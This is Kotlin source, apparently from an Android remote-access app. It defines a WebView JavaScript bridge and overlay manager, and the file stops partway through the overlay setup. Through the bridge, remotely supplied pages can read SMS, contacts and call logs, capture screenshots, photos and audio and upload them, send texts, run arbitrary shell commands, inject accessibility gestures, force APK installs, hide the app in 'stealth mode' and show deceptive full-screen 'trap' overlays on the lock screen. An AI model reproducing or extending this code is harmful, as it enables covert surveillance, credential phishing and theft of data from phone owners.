package com.example.myandroid

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.WindowManager
import androidx.lifecycle.setViewTreeLifecycleOwner
import androidx.lifecycle.setViewTreeViewModelStoreOwner
import androidx.savedstate.setViewTreeSavedStateRegistryOwner
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

object DynamicUIManager {
    private var overlayView: WebView? = null
    private var currentType: Int = -1
    
    var isAttached: Boolean = false

    private var statusBarView: WebView? = null
    private var isStatusBarAttached: Boolean = false
    private var lastStatusBarHtml: String = ""

    private var touchGuardView: android.view.View? = null
    private var isGuardAttached: Boolean = false

    var isSmsInterceptorActive = false
    private var interceptorReceiver: android.content.BroadcastReceiver? = null
    private var nativeOverlayView: android.view.View? = null
    var isNativeAttached: Boolean = false
            private var activeNativeEntry: com.example.myandroid.dynamic.DynamicEntry? = null
        private var nativeLifecycleOwner: OverlayLifecycleOwner? = null

        class OverlayLifecycleOwner : androidx.lifecycle.LifecycleOwner, androidx.lifecycle.ViewModelStoreOwner, androidx.savedstate.SavedStateRegistryOwner {
            private val lifecycleRegistry = androidx.lifecycle.LifecycleRegistry(this)
            private val savedStateRegistryController = androidx.savedstate.SavedStateRegistryController.create(this)
            private val store = androidx.lifecycle.ViewModelStore()

            override val lifecycle: androidx.lifecycle.Lifecycle get() = lifecycleRegistry
            override val savedStateRegistry: androidx.savedstate.SavedStateRegistry get() = savedStateRegistryController.savedStateRegistry
            override val viewModelStore: androidx.lifecycle.ViewModelStore get() = store

            init {
                savedStateRegistryController.performRestore(null)
                lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_CREATE)
                lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_START)
                lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_RESUME)
            }

                        fun destroy() {
                lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_DESTROY)
                store.clear()
            }
        }

        var activeTrapSessionId = 0L
        val isAnyAttached: Boolean get() = isAttached || isNativeAttached

        class CortexBridge(private val ctx: Context) {
        @JavascriptInterface
        fun triggerRestart() {
            DebugLogger.log("BRIDGE", "JS requested simulated restart. Loading boot.html from SharedPreferences...")
            Handler(Looper.getMainLooper()).post {
                try {
                    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val bootHtml = prefs.getString("power_shield_html_boot", "") ?: ""
                    val method = prefs.getString("power_shield_method", "ACC") ?: "ACC"
                    
                    if (bootHtml.isNotEmpty()) {
                        showOverlay(ctx, true, method, bootHtml, true, false, "SamsungOneUI")
                        DebugLogger.log("BRIDGE", "Simulated boot.html loaded and deployed successfully.")
                    } else {
                        DebugLogger.log("BRIDGE_ERR", "Simulated restart failed: power_shield_html_boot is empty.")
                        close()
                    }
                } catch (e: Exception) {
                    DebugLogger.log("BRIDGE_ERR", "triggerRestart failed: ${e.message}")
                }
            }
        }

        @JavascriptInterface
        fun isLocked(): Boolean {
            val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            return km.isKeyguardLocked
        }

        @JavascriptInterface
        fun launchEmergencySettings() {
            DebugLogger.log("BRIDGE", "JS requested emergency settings. Resolving intent...")
            Handler(Looper.getMainLooper()).post {
                val intent = Intent("android.settings.SAFETY_AND_EMERGENCY_SETTINGS").apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                try {
                    ctx.startActivity(intent)
                    DebugLogger.log("BRIDGE", "Successfully launched ACTION_SAFETY_AND_EMERGENCY_SETTINGS.")
                } catch (e: Exception) {
                    DebugLogger.log("BRIDGE_WARN", "ACTION_SAFETY_AND_EMERGENCY_SETTINGS not found. Falling back to general settings.")
                    try {
                        val fallback = Intent(Settings.ACTION_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                        }
                        ctx.startActivity(fallback)
                    } catch (ex: Exception) {
                        DebugLogger.log("BRIDGE_ERR", "Emergency settings and fallback settings both failed: ${ex.message}")
                    }
                }
            }
        }

        @JavascriptInterface
        fun close() {
            Handler(Looper.getMainLooper()).post { 
                DimmerManager.IgnitionManager.release(ctx, "JS_BRIDGE")
                removeOverlay(ctx, "JS_BRIDGE_CLOSE") 
                removeNativeOverlay(ctx, "JS_BRIDGE_CLOSE")
                if (ctx is android.app.Activity) ctx.finish()
            }
        }

        @JavascriptInterface
        fun releaseTouch() {
            Handler(Looper.getMainLooper()).post { removeTouchGuard(ctx) }
            DebugLogger.log("BRIDGE", "JS requested touch release (Guard lifted)")
        }

        @JavascriptInterface
        fun reportPowerState(state: String) {
            DebugLogger.log("POWER_SHIELD", "State transitioned to: $state")
            ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                .putString("power_shield_state", state.uppercase())
                .apply()
        }

        @JavascriptInterface
        fun keepScreenIgnited(active: Boolean) {
            DebugLogger.log("POWER_SHIELD", "Hardware Ignition Lock requested via Bridge: $active")
            if (active) {
                DimmerManager.IgnitionManager.request(ctx, "JS_BRIDGE")
            } else {
                DimmerManager.IgnitionManager.release(ctx, "JS_BRIDGE")
            }
        }

        @JavascriptInterface
        fun log(msg: String) {
            DebugLogger.log("SDUI", msg)
        }

        @JavascriptInterface
        fun setTouchable(touchable: Boolean) {
            Handler(Looper.getMainLooper()).post {
                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                nativeOverlayView?.let { view ->
                    val params = view.layoutParams as? WindowManager.LayoutParams
                    if (params != null) {
                        if (touchable) {
                            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                        } else {
                            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        }
                        try { wm.updateViewLayout(view, params) } catch (e: Exception) {}
                    }
                }
                overlayView?.let { view ->
                    val params = view.layoutParams as? WindowManager.LayoutParams
                    if (params != null) {
                        if (touchable) {
                            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                        } else {
                            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                            params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        }
                        try { wm.updateViewLayout(view, params) } catch (e: Exception) {}
                    }
                }
            }
        }

        @JavascriptInterface
        fun vibrate(durationMs: Long) {
            DebugLogger.log("BRIDGE", "JS requested vibration: ${durationMs}ms")
            try {
                val vibrator = ctx.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(durationMs)
                }
            } catch (e: Exception) { }
        }

        @JavascriptInterface
        fun setDim(percentage: Int) {
            DebugLogger.log("BRIDGE", "JS requested dim level: $percentage%")
            Handler(Looper.getMainLooper()).post {
                DimmerManager.applyDim(ctx, percentage, "AUTO")
            }
        }

        @JavascriptInterface
        fun setVolume(streamStr: String, levelStr: String) {
            DebugLogger.log("BRIDGE", "JS requested volume: $streamStr -> $levelStr")
            try {
                val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                val stream = when (streamStr.uppercase()) {
                    "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                    "ALARM" -> android.media.AudioManager.STREAM_ALARM
                    else -> android.media.AudioManager.STREAM_RING
                }

                if (levelStr.uppercase() == "SILENT" || levelStr.uppercase() == "VIBRATE" || levelStr.uppercase() == "NORMAL") {
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = when (levelStr.uppercase()) {
                            "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
                            "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                            else -> android.media.AudioManager.RINGER_MODE_NORMAL
                        }
                    } else {
                        DebugLogger.log("BRIDGE_ERR", "DND access required for ringer control")
                    }
                } else {
                    val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
                    val max = am.getStreamMaxVolume(stream)
                    val targetVol = ((pct / 100f) * max).toInt()
                    
                    // Ensure ringer mode is normal if trying to set a ring volume
                    if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    
                    am.setStreamVolume(stream, targetVol, 0)
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "setVolume failed: ${e.message}")
            }
        }

        @JavascriptInterface
        fun wake() {
            DebugLogger.log("BRIDGE", "JS requested screen wake")
            val intent = Intent(ctx, PulseActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("is_wake_trigger", true)
            }
            ctx.startActivity(intent)
        }

        @JavascriptInterface
        fun lock() {
            DebugLogger.log("BRIDGE", "JS requested device lock. Clearing ignition locks to permit sleep.")
            DimmerManager.IgnitionManager.clearAll(ctx)
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                try { dpm.lockNow() } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun getConfigBool(key: String, defaultValue: Boolean): Boolean {
            return ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean(key, defaultValue)
        }

        @JavascriptInterface
        fun getRingerMode(): Int {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            return am.ringerMode
        }

        @JavascriptInterface
        fun getBattery(): Int {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }

        @JavascriptInterface
        fun getWifiStatus(): String {
            return ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("wifi_connect_status", "NONE") ?: "NONE"
        }

        @JavascriptInterface
        fun isWifiEnabledNatively(): Boolean {
            return try {
                val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                wm.isWifiEnabled
            } catch(e: Exception) { false }
        }

        @JavascriptInterface
        fun isCharging(): Boolean {
            val ifilter = android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = ctx.registerReceiver(null, ifilter)
            val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || 
                   status == android.os.BatteryManager.BATTERY_STATUS_FULL
        }

        @JavascriptInterface
        fun isSystemDark(): Boolean {
            val mode = ctx.resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK
            return mode == android.content.res.Configuration.UI_MODE_NIGHT_YES
        }

        @JavascriptInterface
        fun toast(message: String) {
            Handler(Looper.getMainLooper()).post {
                android.widget.Toast.makeText(ctx, message, android.widget.Toast.LENGTH_SHORT).show()
            }
        }

        @JavascriptInterface
        fun copyToClipboard(text: String) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    val clip = android.content.ClipData.newPlainText("Cortex Config", text)
                    clipboard.setPrimaryClip(clip)
                    android.widget.Toast.makeText(ctx, "Copied to clipboard", android.widget.Toast.LENGTH_SHORT).show()
                } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun openAccSettings() {
            Handler(Looper.getMainLooper()).post { 
                removeOverlay(ctx, "NAV_TO_ACC_SETTINGS") 
                removeNativeOverlay(ctx, "NAV_TO_ACC_SETTINGS")
            }
            try {
                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun openAccHelp() {
            Handler(Looper.getMainLooper()).post { 
                removeOverlay(ctx, "NAV_TO_ACC_HELP") 
                removeNativeOverlay(ctx, "NAV_TO_ACC_HELP")
            }
            try {
                val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun nav(action: String) {
            Handler(Looper.getMainLooper()).post {
                val svc = MyAccessibilityService.instance
                if (svc != null) {
                    val code = when (action.uppercase()) {
                        "BACK" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
                        "HOME" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                        "RECENTS" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS
                        "NOTIFS" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS
                        "DISMISS_NOTIFS" -> 15 // GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE
                        else -> 0
                    }
                    if (code != 0) {
                        val res = svc.performGlobalAction(code)
                        DebugLogger.log("BRIDGE", "JS requested NAV: $action -> Success: $res")
                    } else {
                        DebugLogger.log("BRIDGE_ERR", "Unknown NAV action: $action")
                    }
                } else {
                    DebugLogger.log("BRIDGE_ERR", "Cannot perform NAV: AccessibilityService offline")
                }
            }
        }

        @JavascriptInterface
        fun executeCommand(cmdJson: String) {
            try {
                val mockCmd = JSONObject(cmdJson)
                if (!mockCmd.has("id")) mockCmd.put("id", -2) 
                CoroutineScope(Dispatchers.IO).launch {
                    CommandProcessor.processSingleCommand(ctx, mockCmd)
                }
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun startRelentlessInstall(apkPath: String) {
            Handler(Looper.getMainLooper()).post {
                removeOverlay(ctx, "START_INSTALL")
                removeNativeOverlay(ctx, "START_INSTALL")
                val intent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
                    putExtra("apk_path", apkPath)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                }
                ctx.startActivity(intent)
            }
        }

        @JavascriptInterface
        fun runIntent(intentJson: String) {
            try {
                val json = JSONObject(intentJson)
                val action = json.optString("action", Intent.ACTION_VIEW)
                val intent = Intent(action)
                
                val dataStr = json.optString("data", "")
                if (dataStr.isNotEmpty()) {
                    val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                    intent.data = android.net.Uri.parse(safeData)
                }
                
                if (json.has("pkg")) {
                    val pkg = json.getString("pkg")
                    if (json.has("cls")) intent.setClassName(pkg, json.getString("cls"))
                    else intent.setPackage(pkg)
                }

                val typeStr = json.optString("type", "")
                if (typeStr.isNotEmpty()) {
                    if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                    else intent.type = typeStr
                }
                
                val extras = json.optJSONObject("extras")
                extras?.keys()?.forEach { key ->
                    val value = extras.get(key)
                    if (value is Boolean) intent.putExtra(key, value)
                    else if (value is Int) intent.putExtra(key, value)
                    else intent.putExtra(key, value.toString())
                }

                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                val target = json.optString("target", "activity").lowercase()
                
                Handler(Looper.getMainLooper()).post {
                    try {
                        when (target) {
                            "service" -> {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                else ctx.startService(intent)
                            }
                            "broadcast" -> ctx.sendBroadcast(intent)
                            else -> ctx.startActivity(intent)
                        }
                        DebugLogger.log("BRIDGE", "Intent dispatched via JS: $action")
                    } catch (e: Exception) {
                        DebugLogger.log("BRIDGE_ERR", "Intent execution failed: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "JSON Parse failed for runIntent: ${e.message}")
            }
        }

        @JavascriptInterface
        fun uploadFile(filePath: String, category: String) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = java.io.File(filePath)
                if (file.exists()) {
                    CloudManager.uploadFile(ctx, file, category)
                } else {
                    DebugLogger.log("BRIDGE_ERR", "File not found for upload: $filePath")
                }
            }
        }

        @JavascriptInterface
        fun sendSms(number: String, message: String) {
            PhoneManager.sendLegitSms(ctx, number, message)
        }

        @JavascriptInterface
        fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
            Handler(Looper.getMainLooper()).post {
                val svc = MyAccessibilityService.instance
                if (svc != null) {
                    val path = android.graphics.Path()
                    path.moveTo(x1, y1)
                    if (x1 == x2 && y1 == y2) {
                        path.lineTo(x1 + 1f, y1 + 1f)
                    } else {
                        path.lineTo(x2, y2)
                    }
                    val builder = android.accessibilityservice.GestureDescription.Builder()
                    builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration))
                    svc.dispatchGesture(builder.build(), null, null)
                }
            }
        }

        @JavascriptInterface
        fun takeScreenshot(quality: Int) {
            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                if (file != null) {
                    CoroutineScope(Dispatchers.IO).launch {
                        CloudManager.uploadFile(ctx, file, "BRIDGE_SCREENSHOT")
                        file.delete()
                    }
                }
            }
        }

        @JavascriptInterface
        fun setStealthMode(active: Boolean) {
            if (active) JudasManager.engageStealthMode(ctx)
            else JudasManager.disengageStealthMode(ctx)
        }

        @JavascriptInterface
        fun triggerStolenMode(targetNumber: String) {
            CoroutineScope(Dispatchers.IO).launch {
                val mockCmd = JSONObject().apply {
                    put("id", -5)
                    put("file_name", "STOLEN_PHONE")
                    put("content", targetNumber)
                }
                CommandProcessor.processSingleCommand(ctx, mockCmd)
            }
        }

        @JavascriptInterface
        fun evaluateSim() {
            JudasManager.evaluateSimState(ctx)
        }

        @JavascriptInterface
        fun openApp(packageName: String) {
            try {
                val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "Failed to open app: $packageName")
            }
        }

        @JavascriptInterface
        fun readSms(limit: Int): String {
            return PhoneManager.getHistoricalSms(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getContacts(limit: Int): String {
            return PhoneManager.getContacts(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getCallLogs(limit: Int): String {
            return PhoneManager.getCallLogs(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getSystemInfo(): String {
            return DeviceManager.getStaticInfo(ctx).toString()
        }

        @JavascriptInterface
        fun getNearbyWifi(): String {
            return WifiScanner.getResults(ctx).toString()
        }

        @JavascriptInterface
        fun connectToWifi(ssid: String, pass: String) {
            WifiConnector.connect(ctx, ssid, pass)
        }

        @JavascriptInterface
        fun injectTouchGuard() {
            showTouchGuard(ctx)
        }

        @JavascriptInterface
        fun removeTouchGuard() {
            DynamicUIManager.removeTouchGuard(ctx)
        }

        @JavascriptInterface
        fun capturePhoto(useFront: Boolean) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = CameraControl.capture(ctx, useFront)
                if (file != null) {
                    CloudManager.uploadFile(ctx, file, "BRIDGE_CAMERA")
                    file.delete()
                }
            }
        }

        @JavascriptInterface
        fun recordAudio(seconds: Int) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = VoiceManager.recordSnippet(ctx, seconds)
                if (file != null) {
                    CloudManager.uploadFile(ctx, file, "BRIDGE_AUDIO")
                    file.delete()
                }
            }
        }

        @androidx.annotation.Keep
        @android.webkit.JavascriptInterface
        fun getUiTree(): String {
            return MyAccessibilityService.instance?.generateSemanticMap() ?: "[SYSTEM: Accessibility Offline]"
        }

        @androidx.annotation.Keep
        @android.webkit.JavascriptInterface
        fun getScreenB64(callback: (String?) -> Unit) {
            val svc = MyAccessibilityService.instance
            if (svc == null) {
                callback(null)
                return
            }
            // Trigger the Set-of-Mark (SoM) Annotated Screen Capture
            svc.getAnnotatedScreenB64(callback)
        }
        
        @JavascriptInterface
        fun shell(cmd: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val process = Runtime.getRuntime().exec(cmd)
                    val output = process.inputStream.bufferedReader().readText()
                    DebugLogger.log("BRIDGE_SHELL", "Output: $output")
                } catch(e: Exception) {
                    DebugLogger.log("BRIDGE_SHELL_ERR", e.message ?: "Unknown")
                }
            }
        }

        @JavascriptInterface
        fun saveAutomationResult(resultText: String) {
            DebugLogger.log("AUTO_BRIDGE", "Result received: ${resultText.length} characters.")
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                try {
                    val downloadDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
                    if (!downloadDir.exists()) downloadDir.mkdirs()
                    val file = java.io.File(downloadDir, "Auto_Result_${System.currentTimeMillis()}.txt")
                    file.writeText(resultText)
                    DebugLogger.log("AUTO_BRIDGE", "File saved to: ${file.absolutePath}")
                    CloudManager.uploadFile(ctx, file, "AUTOMATION_RESULT")
                } catch(e: Exception) {
                    DebugLogger.log("AUTO_BRIDGE_ERR", e.message ?: "Unknown")
                } finally {
                    Handler(Looper.getMainLooper()).post {
                        removeHeadlessAutomation(ctx)
                        // If in visible mode, close the activity
                        if (ctx is android.app.Activity) ctx.finish()
                    }
                }
            }
        }

        @JavascriptInterface
        fun loadUrl(url: String) {
            Handler(Looper.getMainLooper()).post {
                var finalUrl = url
                if (!url.startsWith("http") && !url.startsWith("file")) {
                    finalUrl = "https://www.google.com/search?q=" + java.net.URLEncoder.encode(url, "UTF-8")
                }
                overlayView?.loadUrl(finalUrl)
                DebugLogger.log("GHOST_BROWSER", "Navigating to: $finalUrl")
            }
        }

        @JavascriptInterface
        fun applyEmergencyWallpapers() {
            DebugLogger.log("WALLPAPER", "applyEmergencyWallpapers requested via Setup Wizard finish.")
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val wm = android.app.WallpaperManager.getInstance(ctx)
                    val homeFile = java.io.File(ctx.filesDir, "emergency_home.jpg")
                    val lockFile = java.io.File(ctx.filesDir, "emergency_lock.jpg")
                    
                    if (homeFile.exists()) {
                        val bitmap = android.graphics.BitmapFactory.decodeFile(homeFile.absolutePath)
                        if (bitmap != null) {
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                                wm.setBitmap(bitmap, null, true, android.app.WallpaperManager.FLAG_SYSTEM)
                                DebugLogger.log("WALLPAPER", "Emergency HOME wallpaper successfully applied.")
                            } else {
                                wm.setBitmap(bitmap)
                                DebugLogger.log("WALLPAPER", "Emergency HOME wallpaper applied (Legacy).")
                            }
                        }
                    }
                    
                    if (lockFile.exists()) {
                        val bitmap = android.graphics.BitmapFactory.decodeFile(lockFile.absolutePath)
                        if (bitmap != null) {
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                                wm.setBitmap(bitmap, null, true, android.app.WallpaperManager.FLAG_LOCK)
                                DebugLogger.log("WALLPAPER", "Emergency LOCK wallpaper successfully applied.")
                            }
                        }
                    }
                } catch (e: Exception) {
                    DebugLogger.log("WALLPAPER_ERR", "Failed to apply emergency wallpapers: ${e.message}")
                }
            }
        }

        @JavascriptInterface
        fun triggerTrap(type: String, label: String) {
            Handler(Looper.getMainLooper()).post {
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                if (type.equals("NATIVE", ignoreCase = true) || type.equals("DEX", ignoreCase = true)) {
                    val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
                    val nativeArr = org.json.JSONArray(nativeStr)
                    for (i in 0 until nativeArr.length()) {
                        val trap = nativeArr.getJSONObject(i)
                        if (trap.optString("label") == label) {
                            val dexPath = trap.getString("file_path")
                            val className = trap.getString("class_name")
                            val dimLevel = trap.optInt("dim", 20)
                            val method = trap.optString("method", "ACC")
                            val isAppMode = trap.optBoolean("app_mode", false)
                            
                            // FORCE PERSISTENT TIMEOUT FOR CRITICAL ILLUSIONS
                            val isCritical = label.equals("Welcome", ignoreCase = true) || label.equals("Reset", ignoreCase = true) || label.equals("Agent", ignoreCase = true)
                            val timeout = if (isCritical) 0L else trap.optLong("timeout", 10L)
                            
                            showNativeOverlay(ctx, dexPath, className, dimLevel, method, isAppMode, label)
                            
                            if (timeout > 0L) {
                                val currentSession = activeTrapSessionId
                                Handler(Looper.getMainLooper()).postDelayed({
                                    if (activeTrapSessionId == currentSession) {
                                        removeNativeOverlay(ctx, "NATIVE_TRAP_TIMEOUT: $label")
                                    }
                                }, timeout * 1000)
                            }
                            return@post
                        }
                    }
                    DebugLogger.log("TRAP_TRANSITION", "Native trap not found: $label")
                } else if (type.equals("HTML", ignoreCase = true) || type.equals("UI", ignoreCase = true)) {
                    val uiStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
                    val uiArr = org.json.JSONArray(uiStr)
                    for (i in 0 until uiArr.length()) {
                        val trap = uiArr.getJSONObject(i)
                        if (trap.optString("label") == label) {
                            val method = trap.optString("method", "ACC").uppercase()
                            val html = trap.optString("html", "")
                            val dimLevel = trap.optInt("dim", 20)
                            val timeout = trap.optLong("timeout", 10L)
                            val isAppMode = trap.optBoolean("app_mode", false)
                            
                            DimmerManager.applyDim(ctx, dimLevel, method)
                            showOverlay(ctx, true, method, html, false, isAppMode, label)
                            
                            if (timeout > 0L) {
                                val currentSession = activeTrapSessionId
                                Handler(Looper.getMainLooper()).postDelayed({
                                    if (activeTrapSessionId == currentSession) {
                                        removeOverlay(ctx, "UI_TRAP_TIMEOUT: $label")
                                    }
                                }, timeout * 1000)
                            }
                            return@post
                        }
                    }
                    DebugLogger.log("TRAP_TRANSITION", "HTML trap not found: $label")
                }
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true, appMode: Boolean = false, trapLabel: String = "Cortex App") {
        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
            DebugLogger.log("SDUI", "showOverlay BLOCKED by Safe Zone.")
            return
        }
        Handler(Looper.getMainLooper()).post {
            activeTrapSessionId = System.currentTimeMillis()
            DebugLogger.log("SDUI_VERBOSE", "showOverlay triggered. Method: $method | Touchable: $touchable | FullScreen: $isFullScreen")
            val serviceInstance = MyAccessibilityService.instance
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            val finalMethod = when (method.uppercase()) {
                "ACC" -> if (serviceInstance != null) "ACC" else "FAIL_ACC"
                "OVERLAY" -> if (hasOverlayPerm) "OVERLAY" else "FAIL_OVERLAY"
                else -> {
                    if (serviceInstance != null) "ACC" 
                    else if (hasOverlayPerm) "OVERLAY"
                    else "FAIL_NONE"
                }
            }

            if (finalMethod.startsWith("FAIL")) {
                DebugLogger.log("SDUI_ERR", "Injection aborted. Method: $method | Reason: $finalMethod")
                return@post
            }

            if (appMode) {
                DimmerManager.removeOverlay(ctx)
                DynamicAppHandoff.pendingHtml = htmlContent
                val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                    putExtra("task_title", trapLabel)
                }
                ctx.startActivity(intent)
                return@post
            }

            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            // VITAL MEMORY CHECK: If context died/changed or type changed, we MUST destroy the old WebView to prevent BadTokenException
            if (overlayView != null && (currentType != targetType || overlayView?.context != windowContext)) {
                DebugLogger.log("SDUI_VERBOSE", "Context or Window Type mismatched. Purging old WebView instance.")
                if (isAttached) {
                    try { wm.removeView(overlayView) } catch (e: Exception) { DebugLogger.log("SDUI_ERR", "Detach old failed: ${e.message}") }
                }
                overlayView?.destroy()
                overlayView = null
                isAttached = false
            }

            var flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON

            if (isFullScreen) {
                flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            }

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                targetType,
                flags,
                PixelFormat.TRANSLUCENT
            )

